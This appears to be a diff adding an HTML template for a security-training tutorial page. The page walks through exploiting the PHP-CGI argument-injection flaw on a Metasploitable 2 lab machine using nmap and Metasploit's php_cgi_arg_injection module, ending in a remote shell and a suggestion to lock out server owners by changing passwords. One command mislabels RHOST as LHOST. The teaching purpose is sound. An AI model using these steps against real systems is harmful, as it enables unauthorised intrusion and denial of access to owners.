@@ -1,1 +1,173 @@
-<p>scen-two works!</p>
+<div class="card">
+    <div class="card-body">
+      <h5 class="card-title">{{cardTitle}}</h5>
+      <h6 class="card-subtitle mb-2 text-muted">{{cardSubtitle}}</h6>
+      <p class="card-text">
+        In this scenario we will focus on the PHP-CGI query string parameter vulnerability. 
+        When PHP is used in a CGI-based environment, PHP-CGI receives a processed query string parameter
+        as a command line argument. This in turn allows command line switches, such as -s, -d or -c, to be passed
+        to the PHP-CGI binary. This can be exploited to reveal source-code and obtain access to arbitrary code excecutions.
+
+        <br><br>
+        A potential attacker could obtain sensitive information, cause a DoS attack, or can also execute code with elevated privileges
+        inside the web server.
+
+        <br><br>
+        In this scenario, we will be taking a detailed look at this exploit by attacking Port 80, which is commonly used by PHP,
+        that is hosted on our traget machine (Metasploitable 2).
+      </p>
+    </div>
+  </div>
+  
+  <div class="accordion accordion-flush" id="accordionFlushExample">
+      <div class="accordion-item">
+        <h2 class="accordion-header" id="flush-headingOne">
+          <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseOne" aria-expanded="false" aria-controls="flush-collapseOne">
+            {{accOneTitle}}
+          </button>
+        </h2>
+        <div id="flush-collapseOne" class="accordion-collapse collapse" aria-labelledby="flush-headingOne" data-bs-parent="#accordionFlushExample">
+          <div class="accordion-body">
+            <h5>Run the nmap command in the terminal</h5> <br>
+            <h6>command: nmap -p- -sV "target machine's ip address"</h6> <br>
+            <div class="text-center">
+              <img src="assets/scen_2/1.png" class="img-fluid" alt="...">
+            </div>
+            <p>
+              Once the command has finished running, nmap will provide a report on all the ports
+              that are open on the target machine. This allows the attacker to easily exploit a number of vulnerabilities
+              without searching manually for the vulnerabilities.
+            </p>
+          </div>
+        </div>
+      </div>
+  
+      <div class="accordion-item">
+        <h2 class="accordion-header" id="flush-headingTwo">
+          <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseTwo" aria-expanded="false" aria-controls="flush-collapseTwo">
+            {{accTwoTitle}}
+          </button>
+        </h2>
+        <div id="flush-collapseTwo" class="accordion-collapse collapse" aria-labelledby="flush-headingTwo" data-bs-parent="#accordionFlushExample">
+          <div class="accordion-body">
+            <h5>Run the msfconsole command and ifconfig command in the terminal (Kali linux).</h5> <br>
+            <h6>command: ifconfig</h6>
+            <h6>command: msfconsole</h6> <br>
+            <div class="text-center">
+              <img src="assets/scen_2/2.png" class="img-fluid" alt="...">
+            </div>
+            <p>
+              The Kali Linux vertial machine's IP address can be found at adapter eth0 at inet. In this case the address is:
+              192.168.208.128. Make a note of this IP address, it is important later in the tutorial.
+            </p>
+          </div>
+        </div>
+      </div>
+  
+      <div class="accordion-item">
+        <h2 class="accordion-header" id="flush-headingThree">
+          <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseThree" aria-expanded="false" aria-controls="flush-collapseThree">
+            {{accThreeTitle}}
+          </button>
+        </h2>
+        <div id="flush-collapseThree" class="accordion-collapse collapse" aria-labelledby="flush-headingThree" data-bs-parent="#accordionFlushExample">
+          <div class="accordion-body">
+            <h5>Search for the PHP exploit within Metasploit</h5><br>
+            <h6>command: search type:exploit/multi/http/php</h6><br>
+            <div class="text-center">
+              <img src="assets/scen_2/3.png" class="img-fluid" alt="...">
+            </div>
+            <p>
+                This command provides a table of all the PHP related exploits that are available in Metasploit.
+                For this tutorial we are interested in the one located at index 0 in the table (php_cgi_arg_injection).
+            </p>
+          </div>
+        </div>
+      </div>
+  
+      <div class="accordion-item">
+        <h2 class="accordion-header" id="flush-headingTwo">
+          <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseFour" aria-expanded="false" aria-controls="flush-headingFour">
+            {{accFourTitle}}
+          </button>
+        </h2>
+        <div id="flush-collapseFour" class="accordion-collapse collapse" aria-labelledby="flush-headingFour" data-bs-parent="#accordionFlushExample">
+          <div class="accordion-body">
+            <h5>Select the exploit and show information about it</h5> <br>
+            <h6>command: use 0</h6>
+            <h6>command: show info</h6> <br>
+            <div class="text-center">
+              <img src="assets/scen_2/4.png" class="img-fluid" alt="...">
+            </div>
+            <p>
+              use 0: Selects the exploit from the table in the previous step. <br>
+              show info: Displays all the information regarding the exploit.
+            </p>
+          </div>
+        </div>
+      </div>
+  
+      <div class="accordion-item">
+        <h2 class="accordion-header" id="flush-headingTwo">
+          <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseFive" aria-expanded="false" aria-controls="flush-headingFive">
+            {{accFiveTitle}}
+          </button>
+        </h2>
+        <div id="flush-collapseFive" class="accordion-collapse collapse" aria-labelledby="flush-headingFive" data-bs-parent="#accordionFlushExample">
+          <div class="accordion-body">
+            <h5>Find the options of the exploit</h5> <br>
+            <h6>command: show options</h6> <br>
+            <div class="text-center">
+              <img src="assets/scen_2/5.png" class="img-fluid" alt="...">
+            </div>
+            <p>
+                This diplays all the options available that we can configure before running the exploit. <br>
+                We are interested in the payload options for this tutorial. Specifically the LHOST and RHOST payload options.
+            </p>
+          </div>
+        </div>
+      </div>
+  
+      <div class="accordion-item">
+        <h2 class="accordion-header" id="flush-headingTwo">
+          <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseSix" aria-expanded="false" aria-controls="flush-headingSix">
+            {{accSixTitle}}
+          </button>
+        </h2>
+        <div id="flush-collapseSix" class="accordion-collapse collapse" aria-labelledby="flush-headingSix" data-bs-parent="#accordionFlushExample">
+          <div class="accordion-body">
+            <h5>Set LHOST and RHOST options</h5> <br>
+            <h6>command: set lhost "Kali machine's IP address"</h6>
+            <h6>command: set lhost "Target machine's IP address"</h6> <br>
+            <div class="text-center">
+              <img src="assets/scen_2/6.png" class="img-fluid" alt="...">
+            </div>
+            <p>
+              Setting LHOST: We need to specify to which machine the exploit must send the response to.
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion-item">
+        <h2 class="accordion-header" id="flush-headingTwo">
+          <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseSev" aria-expanded="false" aria-controls="flush-headingSev">
+            {{accSevTitle}}
+          </button>
+        </h2>
+        <div id="flush-collapseSev" class="accordion-collapse collapse" aria-labelledby="flush-headingSev" data-bs-parent="#accordionFlushExample">
+          <div class="accordion-body">
+            <h5>Run the exploit</h5> <br>
+            <h6>command: run</h6> <br>
+            <div class="text-center">
+              <img src="assets/scen_2/7.png" class="img-fluid" alt="...">
+            </div>
+            <p>
+              Success! We have taken control of the target machine's command prompt. From here a number of exploits can be executed. <br>
+              An example is the fact that we can change the passwords of the PHP web server and therefore lock out the owners of the server.
+            </p>
+          </div>
+        </div>
+      </div>
+        
+    </div>
